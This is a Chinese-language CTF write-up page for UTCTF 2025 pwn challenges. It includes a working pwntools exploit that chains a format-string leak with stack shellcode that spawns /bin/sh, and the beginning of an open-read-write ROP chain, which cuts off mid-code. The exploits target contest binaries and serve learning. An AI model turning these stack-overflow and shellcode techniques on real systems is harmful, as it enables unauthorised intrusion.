<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>UTCTF 2025 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta name="description" content="2025 UPCTF Pwn 题解"/><meta property="og:title" content="UTCTF 2025 Writeup | 花盆"/><meta property="og:description" content="2025 UPCTF Pwn 题解"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/UTCTF2025-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="utctf-2025-writeup" class="scroll-target"><a href="#utctf-2025-writeup"><code class="hash inline-code">#</code>UTCTF 2025 Writeup</a></h1>
<p>国赛前一天的一个国际赛，跟 N1 junior 的师傅们一起打一下。</p>
<h2 id="tic-tac-toe" class="scroll-target"><a href="#tic-tac-toe"><code class="hash inline-code">#</code>Tic Tac Toe</a></h2>
<p>全都是 <code class="inline-code">gets</code>，baby pwn</p>
<p>无限制的栈溢出可以随便打，溢出一下，覆盖掉 <code class="inline-code">player</code> 的那个 <code class="inline-code">int</code> 就可以 <code class="inline-code">win</code> 了</p>
<p>没写 exp，就不贴了。</p>
<h2 id="retirement-plan" class="scroll-target"><a href="#retirement-plan"><code class="hash inline-code">#</code>RETirement Plan</a></h2>
<p>存在一个对字母的检查，<code class="inline-code">__ctype_b_loc</code> 这个函数见到几次了，它返回的是指向字符属性表的指针，一般写法是 <code class="inline-code">(*__ctype_b_loc())[v5[i]] &amp; 0x100</code>，可以保证线程安全。</p>
<p>题目有个无限制的 <code class="inline-code">gets</code>，还有个格式化字符串，而且没开 NX，所以可以先打印一个栈地址然后返回 <code class="inline-code">main</code>，再读入 shellcode 在栈上执行。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./shellcode_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">challenge.utctf.live</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A">9009</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">b *0x40063c</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">%17$pB</span><span style="color:#B5695977">"</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#2993a3">(</span><span style="color:#2F798A">48</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">601051</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">b</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><br><span style="color:#A0ADA0"># payload += asm(shellcraft.sh())</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#1e754f">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">main</span><span style="color:#B5695977">'</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">stack_addr </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Baa</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"stack_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">shellcode </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">shellcode </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"""</span><br><span style="color:#B56959">mov rdi, r13</span><br><span style="color:#B56959">sub rdi, 0x120</span><br><span style="color:#B56959">xor rsi, rsi</span><br><span style="color:#B56959">xor rdx, rdx</span><br><span style="color:#B56959">mov al, 0x3b</span><br><span style="color:#B56959">syscall</span><br><span style="color:#B5695977">"""</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#2993a3">(</span><span style="color:#2F798A">40</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x90</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">shellcode </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">601051</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">b</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">c</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><br><span style="color:#393A34">shellcode </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">stack_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">120</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> shellcode</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./shellcode_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">challenge.utctf.live</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91">9009</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">b *0x40063c</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">%17$pB</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">48</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">601051</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">b</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><br><span style="color:#758575DD"># payload += asm(shellcraft.sh())</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#4d9375">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">main</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Baa</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"stack_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">shellcode </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">shellcode </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"""</span><br><span style="color:#C98A7D">mov rdi, r13</span><br><span style="color:#C98A7D">sub rdi, 0x120</span><br><span style="color:#C98A7D">xor rsi, rsi</span><br><span style="color:#C98A7D">xor rdx, rdx</span><br><span style="color:#C98A7D">mov al, 0x3b</span><br><span style="color:#C98A7D">syscall</span><br><span style="color:#C98A7D77">"""</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">40</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x90</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">shellcode </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">601051</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">b</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">c</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><br><span style="color:#DBD7CAEE">shellcode </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">120</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> shellcode</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>一开始的时候想用 pwntools 自带的 shellcode，但是有点长，后面部分字节会被修改掉，于是去 shell-storm 翻了翻，<code class="inline-code">push rsp</code> 执行后就会 dump，感觉也不太彳亍</p>
<p>所以自己手搓了一下。</p>
<p>另外学到了一个：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-asm language-asm"><span style="color:#AB5959">mov</span><span style="color:#1E754F"> rbx</span><span style="color:#393A34">, </span><span style="color:#2F798A">0xFF978CD091969DD1</span><br><span style="color:#AB5959">neg</span><span style="color:#1E754F"> rbx</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-asm language-asm"><span style="color:#CB7676">mov</span><span style="color:#4D9375"> rbx</span><span style="color:#DBD7CAEE">, </span><span style="color:#4C9A91">0xFF978CD091969DD1</span><br><span style="color:#CB7676">neg</span><span style="color:#4D9375"> rbx</span><br></code></pre></div>
<p><code class="inline-code">neg</code> 指令可以把寄存器取反加 1，也就是用 0 减去 <code class="inline-code">rbx</code>。</p>
<h2 id="secbof" class="scroll-target"><a href="#secbof"><code class="hash inline-code">#</code>secbof</a></h2>
<p>orw 题，比较坑的地方是题目用 <code class="inline-code">socat</code> 开的环境，然后占用了 3 4 文件描述符，以后打这种给了 dockerfile 的题本地通远程不通可以自己起一个 docker 看一下。</p>
<p>另一个注意的点是 <code class="inline-code">open syscall</code> 的时候 <code class="inline-code">rsi/rdx</code> 不能直接不管，<code class="inline-code">rsi</code> 是 access，<code class="inline-code">rdx</code> 是 permissions，前者是打开权限（rwx），后者只会在新创建文件时用到，所以前者不能不管（</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./chal</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">127.0.0.1</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 9000</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">b *0x4019a3</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000040204f</span><br><span style="color:#393A34">pop_rsi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000040a0be</span><br><span style="color:#393A34">pop_rdx_rbx_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000048630b</span><br><span style="color:#393A34">pop_rax_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000450507</span><br><span style="color:#393A34">syscall </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000044EF59</span><br><span style="color:#393A34">flag </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4CA8E0</span><br><span style="color:#393A34">ans </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4CA900</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 128</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">b</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_rbx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">read</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#393A34"> 